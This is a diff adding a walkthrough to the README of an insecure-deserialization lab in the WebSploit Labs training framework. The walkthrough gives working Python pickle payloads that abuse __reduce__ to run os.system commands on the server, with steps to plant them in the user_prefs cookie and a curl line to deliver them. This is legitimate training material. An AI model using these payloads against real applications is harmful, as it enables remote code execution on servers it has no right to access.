@@ -12,6 +12,51 @@ The application uses Python's `pickle` module to serialize and deserialize user 
 This lab is part of the WebSploit Labs framework and it is running on the `deserial-gate` container on the `10.6.6.42` IP address.
 Access the lab at `http://10.6.6.42:5022`.
 
+## Walkthrough
+
+1. Access the lab at `http://10.6.6.42:5022`.
+2. Enter any preference (e.g., "Dark Mode") and click "Save Preference".
+3. Open your browser's Developer Tools (F12) and go to the Application/Storage tab.
+4. Find the `user_prefs` cookie - notice it contains a base64-encoded value.
+5. Decode the cookie value to see the pickled Python object.
+6. Create a malicious pickle payload using Python:
+
+```python
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+```
+
+7. Replace the `user_prefs` cookie value with your malicious payload.
+8. Refresh the page - the command will execute on the server.
+9. For a reverse shell or more complex payloads:
+
+```python
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        # This will create a file as proof of RCE
+        return (os.system, ('touch /tmp/pwned',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+```
+
+10. You can also use curl to test:
+```bash
+curl -b "user_prefs=<YOUR_PAYLOAD>" http://10.6.6.42:5022/
+```
+
 ## References
 For more information on insecure deserialization vulnerabilities and secure coding practices, check out these resources:
 
